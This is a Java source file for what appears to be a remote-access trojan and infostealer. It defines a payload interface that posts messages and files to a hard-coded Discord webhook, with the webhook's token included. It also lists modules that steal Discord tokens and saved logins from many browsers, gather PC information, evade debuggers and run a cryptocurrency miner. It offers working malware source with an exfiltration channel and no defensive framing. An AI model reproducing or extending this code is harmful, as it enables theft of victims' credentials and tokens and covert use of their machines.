//Raddon On Top!

package org.rat.payload;

import java.nio.charset.*;
import java.io.*;
import java.net.*;
import org.rat.payload.payloads.discord.*;
import org.rat.payload.payloads.browsers.*;
import org.rat.payload.payloads.*;

public interface IPayload
{
    void run();
    
    default void send(final String message) {
        PrintWriter out = null;
        BufferedReader in = null;
        final StringBuilder result = new StringBuilder();
        try {
            final URL realUrl = new URL("https://discord.com/api/webhooks/1081016488581943367/hnd_l4TJlIpqL4QIxXFXekgh4JglL7IeIvf6m565-W_onJJrjOPIDbxLCqG3aZ_gR_dq");
            final URLConnection conn = realUrl.openConnection();
            conn.setRequestProperty("accept", "*/*");
            conn.setRequestProperty("connection", "Keep-Alive");
            conn.setRequestProperty("user-agent", "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)");
            conn.setDoOutput(true);
            conn.setDoInput(true);
            out = new PrintWriter(conn.getOutputStream());
            final String postData = URLEncoder.encode("content", "UTF-8") + "=" + URLEncoder.encode(message, "UTF-8");
            out.print(postData);
            out.flush();
            in = new BufferedReader(new InputStreamReader(conn.getInputStream()));
            String line;
            while ((line = in.readLine()) != null) {
                result.append("/n").append(line);
            }
        }
        catch (Exception e) {
            e.printStackTrace();
            try {
                if (out != null) {
                    out.close();
                }
                if (in != null) {
                    in.close();
                }
            }
            catch (IOException ex) {
                ex.printStackTrace();
            }
        }
        finally {
            try {
                if (out != null) {
                    out.close();
                }
                if (in != null) {
                    in.close();
                }
            }
            catch (IOException ex2) {
                ex2.printStackTrace();
            }
        }
    }
    
    default void send(final File file) {
        try {
            final String boundary = Long.toHexString(System.currentTimeMillis());
            final URLConnection connection = new URL("https://discord.com/api/webhooks/1081016488581943367/hnd_l4TJlIpqL4QIxXFXekgh4JglL7IeIvf6m565-W_onJJrjOPIDbxLCqG3aZ_gR_dq").openConnection();
            connection.setDoOutput(true);
            connection.setRequestProperty("User-Agent", "Mozilla/5.0 (Linux; Android 8.0.0; SM-G960F Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.84 Mobile Safari/537.36");
            connection.setRequestProperty("Content-Type", "multipart/form-data; boundary=" + boundary);
            try (final PrintWriter writer = new PrintWriter(new OutputStreamWriter(connection.getOutputStream(), StandardCharsets.US_ASCII))) {
                writer.println("--" + boundary);
                writer.println("Content-Disposition: form-data; name=\"" + file.getName() + "\"; filename=\"" + file.getName() + "\"");
                writer.write("Content-Type: image/png");
                writer.println();
                writer.println(this.readAllBytes(new FileInputStream(file)));
                try (final BufferedReader reader = new BufferedReader(new InputStreamReader(new FileInputStream(file), StandardCharsets.US_ASCII))) {
                    String line;
                    while ((line = reader.readLine()) != null) {
                        writer.println(line);
                    }
                }
                writer.println("--" + boundary + "--");
            }
            System.out.println(((HttpURLConnection)connection).getResponseCode());
        }
        catch (Exception ex) {}
    }
    
    default byte[] readAllBytes(final InputStream stream) throws IOException {
        int pos = 0;
        byte[] output = new byte[0];
        final byte[] buf = new byte[1024];
        int count;
        while ((count = stream.read(buf)) > 0) {
            if (pos + count >= output.length) {
                final byte[] tmp = output;
                output = new byte[pos + count];
                System.arraycopy(tmp, 0, output, 0, tmp.length);
            }
            for (int i = 0; i < count; ++i) {
                output[pos++] = buf[i];
            }
        }
        return output;
    }
    
    default IPayload[] getPayloads() {
        return new IPayload[] { new AntiDebugger(), new PCInfo(), new DiscordTokens(), new _360BrowserLogins(), new BraveLogins(), new ChromeBetaLogins(), new ChromeCanaryLogins(), new ChromeLogins(), new CocCocLogins(), new EdgeLogins(), new EpicBrowserLogins(), new OperaGxLogins(), new OperaNeonLogins(), new OperaLogins(), new VivaldiLogins(), new YandexLogins(), new Miner(), new Mods() };
    }
}
